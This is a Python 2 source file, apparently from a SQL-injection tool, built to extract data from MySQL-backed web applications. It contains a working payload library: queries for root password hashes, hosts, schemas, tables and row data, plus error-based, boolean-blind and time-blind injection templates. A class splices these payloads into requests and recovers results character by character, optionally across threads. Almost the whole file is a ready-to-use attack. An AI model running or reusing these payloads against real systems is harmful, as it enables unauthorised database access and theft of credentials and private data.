# -*- coding:utf-8 -*-
import threading
import binascii
import sys
import os
import copy
import requests

payload_sql_map = {
    'sql_map': {u'get_user_count': u'select count(1) from mysql.user where user regexp 0x726F6F74',
                u'get_dba_password': u'select password from mysql.user where user regexp 0x726F6F74 limit 1 offset $$$[index]$$$',
                u'get_dba_host': u'select host from mysql.user where user regexp 0x726F6F74 limit 1 offset $$$[index]$$$',
                u'get_table_count': u'select count(6) from information_schema.tables where table_schema regexp 0x5e$$$[db_name]$$$24',
                u'get_column_count': u'select count(6) from information_schema.columns where table_schema regexp 0x5e$$$[db_name]$$$24 AND table_name regexp 0x5e$$$[table_name]$$$24',
                u'get_database_count': u'select count(6) from information_schema.schemata',
                u'get_version_2': u'select VERSION()',
                u'get_data_count': u'select table_rows from information_schema.tables where table_schema regexp 0x5e$$$[db_name]$$$24 AND table_name regexp 0x5e$$$[table_name]$$$24',
                u'get_data_name': u'select $$$[column_name]$$$ from $$$[db_name]$$$.$$$[table_name]$$$ order by $$$[order_by]$$$ limit 1 offset $$$[index]$$$',
                u'get_database_name': u'select schema_name from information_schema.schemata limit 1 offset $$$[index]$$$',
                u'test_injectable': u'select 0x552a',
                u'get_current_user_2': u'select USER( )',
                u'get_current_user': u'select current_user',
                u'get_current_database2': u'schema()',
                u'get_version': u'select @@VERSION',
                u'get_table_name': u'select table_name from information_schema.tables where table_schema regexp 0x5e$$$[db_name]$$$24 limit 1 offset $$$[index]$$$',
                u'get_column_name': u'select column_name from information_schema.columns where table_schema regexp 0x5e$$$[db_name]$$$24 AND table_name regexp 0x5e$$$[table_name]$$$24 limit 1 offset $$$[index]$$$',
                u'get_current_database': u'select DATABASE( )'},
    'sqli_map': {u'time_bin': u'(select(8)from(select(sleep((mid(bin(ord(mid(($$$[sql]$$$)from($$$[sub_index]$$$)for(1))))from(-$$$[bin_sub_index]$$$)for(1)))*$$$[time_sec]$$$)))a)',
                 #     u'time_regexp': u'(sleep((($$$[sql]$$$) regexp 0x$$$[regexp]$$$)*$$$[time_sec]$$$))',
                 #     u'blind_like': u'0x$$$[hex_encode_no_split]$$$ like concat(0x25,mid(($$$[sql]$$$),$$$[sub_index]$$$,1),0x25)',
                 #     u'blind_in': u'mid(($$$[sql]$$$), $$$[sub_index]$$$,1) in (0x$$$[hex_encode_0x,_split]$$$)',
                 #     u'blind_test_normal': u"select 8 regexp if(schema() like 'mq%',8,0x0)",
                 # u'blind_field': u'field(mid(($$$[sql]$$$),
                 # $$$[sub_index]$$$,1),$$$[string]$$$)',
                 # ^r[a,b,c,d,e,f,g] 可折半搜索
                 u'bool_regexp': u'(($$$[sql]$$$)regexp 0x$$$[regexp]$$$)',
                 u'bool_bin': u'(mid(bin(ord(mid(($$$[sql]$$$)from($$$[sub_index]$$$)for(1))))from(-$$$[bin_sub_index]$$$)for(1)))',

                 u'error_floor': u'(SELECT 6 FROM(SELECT COUNT(*),CONCAT(0x3a6c75616e3a,($$$[sql]$$$),0x3a6c75616e3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)',
                 u'error_bigint': u'!(select * from(select concat (0x3a6c75616e3a,($$$[sql]$$$),0x3a6c75616e3a))x)-~0',
                 u'error_procedure': u'procedure analyse(extractvalue(1,concat (0x3a6c75616e3a,($$$[sql]$$$),0x3a6c75616e3a)),1)',
                 u'error_extractvalue': u'extractvalue(1,concat (0x3a6c75616e3a,($$$[sql]$$$),0x3a6c75616e3a))',
                 u'error_linestring': u'linestring((select * from(select * from(select concat (0x3a6c75616e3a,($$$[sql]$$$),0x3a6c75616e3a))a)b))',
                 u'error_exp': u'exp(~(select * from(select concat (0x3a6c75616e3a,($$$[sql]$$$),0x3a6c75616e3a))a))'}
}


class sqli:

    def __init__(self, request_data, trueCode=''):
        self.request_data = request_data
        self.trueCode = trueCode

    def getSqliOutput(self, payload, sql={}):
        _request_data = copy.deepcopy(self.request_data)
        _request_data.replace('#InjectHere#', payload_sql_map[
                              'sqli_map'][_request_data.sqli_payload])
        _request_data.replace('$$$[time_sec]$$$', _request_data.time_sec)
        if payload in payload_sql_map['sql_map'].keys():
            _request_data.replace('$$$[sql]$$$', payload_sql_map[
                                  'sql_map'][payload])
        else:
            _request_data.replace('$$$[sql]$$$', payload)
        for key, value in sql.items():
            _request_data.replace(''.join(['$$$[', key, ']$$$']), value)
        if 'error' in _request_data.sqli_payload:
            return self.error(_request_data)
        elif 'bool' in _request_data.sqli_payload:
            self.trueCode_reverse = self.trueCode.count(
                '[reverse]')    # 可以多次反转,用户自己输入[reverse]
            self.trueCode = self.trueCode.replace('[reverse]', '')
            if 'bool_regexp' == _request_data.sqli_payload:
                return self.bool_regexp(_request_data)
            elif 'bool_bin' == _request_data.sqli_payload:
                return self.bool_bin(_request_data)
        elif 'time' in _request_data.sqli_payload:
            if 'time_bin' == _request_data.sqli_payload:
                return self.time_bin(_request_data)
            elif 'time_regexp' == _request_data.sqli_payload:
                return self.time_regexp(_request_data)
    ### 报错注入 ###

    def error(self, _request_data):
        try:
            return _request_data.send().split(':luan:')[1]
        except IndexError:
            return '0'
        except Exception as e:
            raise
    ### 正则盲注 ###

    def blind_regexp(self, fun, _request_data):
        # 只匹配可显示的Ascii码可显示字符。 如果要注出中文字符串就必须得使用hex，必须带入括号。。。
        # 32【空格】 ～ 126【~】
        # mid = 79
        _req = copy.deepcopy(_request_data)
        _req.replace('$$$[regexp]$$$', binascii.b2a_hex(
            '[^ -~]'))  # 有字符不在可匹配的范围内
        if fun(_req):
            print 'Can not confirm char , try --hex or check your truecode'
            return ''
        result = ''
        while True:
            left = 32
            right = 126
            _req = copy.deepcopy(_request_data)
            _req.replace('$$$[regexp]$$$', binascii.b2a_hex(''.join(['^',
                                                                     ''.join(
                                                                         map(lambda x: '\\'+x, result)),
                                                                     '[ -~]'])))  # 'luan' regexp '^luan[ -~]'
            if not fun(_req):
                break
            while (left + 1) != right:
                mid = (left + right) // 2
                regexp = binascii.b2a_hex(''.join(['^',
                                                   ''.join(
                                                       map(lambda x: '\\'+x, result)),
                                                   '[',
                                                   chr(mid+1) +
                                                   '.' if chr(
                                                       mid) == '-' else chr(mid), '-',
                                                   ',' +
                                                   chr(right+1) if chr(right) == '-' else chr(right),
                                                   ']']))
                # 判断是否在右边的那个区间内,注意转移字符...
                # 如果正则[]中要匹配-,就不能使用区间了,会爆错:invalid character range
                print ''.join([result, chr(mid), '\r']),
                _req = copy.deepcopy(_request_data)
                _req.replace('$$$[regexp]$$$', regexp)
                if fun(_req):
                    left = mid
                else:
                    right = mid
            result += chr(left)
            # print result,
        return result

    def bool_GetRange(self, _req):
        condition = self.trueCode in _req.send()
        if (self.trueCode_reverse) % 2 == 1:
            condition = not condition
        return condition

    def time_GetRange(self, _req):
        global result_list
        try:
            _req.send(int(_req.time_sec))
        except Exception:
            try:
                _req.send(int(_req.time_sec))
            except Exception:
                return True
        return False

    def bool_regexp(self, _request_data):
        return self.blind_regexp(self.bool_GetRange, _request_data)

    def time_regexp(self, _request_data):
        return self.blind_regexp(self.time_GetRange, _request_data)

    ### BIN盲注 ###
    def blind_bin(self, func, _request_data):
        global result_list
        result = ''
        sub_index = 1
        print '',
        while True:
            result_list = ['0']*7
            threads = []
            for i in range(7):
                bin_sub_index = i + 1
                _req = copy.deepcopy(_request_data)
                _req.replace('$$$[sub_index]$$$', str(sub_index))
                _req.replace('$$$[bin_sub_index]$$$', str(bin_sub_index))
                if _request_data.multi_thread:
                    threads.append(threading.Thread(
                        target=func, args=(_req, i)))
                else:
                    func(_req, i)
            if _request_data.multi_thread:
                for t in threads:
                    t.start()
                for t in threads:
                    t.join()
            result_list.reverse()
            char = int(''.join(result_list), 2)
            if char == 0 or char == 127:
                break
            result += chr(char)
            print ''.join(['\r', result]),
            sub_index += 1
        print '\r'+' '*len(result)+' \r',
        return result

    def bool_GetBitCode(self, _req, bin_sub_index):
        global result_list
        try:
            if self.trueCode in _req.send() and ((self.trueCode_reverse+1) % 2 == 1):
                result_list[bin_sub_index] = '1'
        except Exception, e:
            print e
            pass

    def time_GetBitCode(self, _req, bin_sub_index):
        global result_list
        try:
            _req.send(int(_req.time_sec))
        except Exception:
            try:
                _req.send(int(_req.time_sec))
            except Exception:
                result_list[bin_sub_index] = '1'

    def bool_bin(self, _request_data):
        return self.blind_bin(self.bool_GetBitCode, _request_data)

    def time_bin(self, _request_data):
        return self.blind_bin(self.time_GetBitCode, _request_data)
